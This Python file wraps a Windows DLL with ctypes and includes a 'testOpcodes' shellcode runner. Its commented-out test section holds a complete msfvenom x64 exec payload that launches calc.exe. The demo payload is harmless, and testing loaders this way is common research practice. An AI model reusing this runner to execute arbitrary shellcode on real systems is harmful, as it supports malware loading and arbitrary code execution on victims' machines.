import ctypes
import pefile

# Documentation:
# Add more functions: 
# (+) first check the function name after loading the DLL by using the print_exported_functions() function
# (+) then add the correct function input and output format to the DLLDefinedFunctions class
# (+) finally, add the function to the DLLIntegration class which at the end of init function

class DLLDefinedFunctions():
    @staticmethod
    def _myadd(mydll: ctypes.CDLL):
        mydll.myadd.argtypes = (ctypes.c_int, ctypes.c_int)
        mydll.myadd.restype = ctypes.c_int
    
    @staticmethod
    def _testOpcodes(mydll: ctypes.CDLL):
        mydll.testOpcodes.argtypes = (ctypes.c_char_p, ctypes.c_int)
        mydll.testOpcodes.restype = ctypes.c_void_p

class DLLIntegration():
    def __init__(self, dll_path):
        self.mydll = ctypes.CDLL(dll_path)
        self.pe = pefile.PE(dll_path)
        
        DLLDefinedFunctions._myadd(self.mydll)
        DLLDefinedFunctions._testOpcodes(self.mydll)

    def print_exported_functions(self):
        print("Exported Functions:")
        for exp in self.pe.DIRECTORY_ENTRY_EXPORT.symbols:
            print(f" - {exp.name.decode()}" if exp.name else " - (Unnamed)")

    def add(self, a, b):
        return self.mydll.myadd(a, b)
    
    def testOp(self, op):
        return self.mydll.testOpcodes(op, len(op))


#------------------------ Load the DLL------------
# dll_path = "libs/main.dll"
# mylibs = DLLIntegration(dll_path)

#------------------------ Print the exported functions------------
# mylibs.print_exported_functions()

#------------------------ Test the add function------------
# print(mylibs.add(1, 2))

#------------------------ Test the shellcode------------
# shellcode which generate by: 'msfvenom --payload windows/x64/exec CMD='cacl.exe' -f py'
# cmd_calc =  b""
# cmd_calc += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
# cmd_calc += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
# cmd_calc += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
# cmd_calc += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
# cmd_calc += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
# cmd_calc += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
# cmd_calc += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
# cmd_calc += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
# cmd_calc += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
# cmd_calc += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
# cmd_calc += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
# cmd_calc += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
# cmd_calc += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
# cmd_calc += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
# cmd_calc += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
# cmd_calc += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
# cmd_calc += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
# cmd_calc += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
# cmd_calc += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
# cmd_calc += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
# cmd_calc += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
# cmd_calc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
# cmd_calc += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# mylibs.testOp(cmd_calc)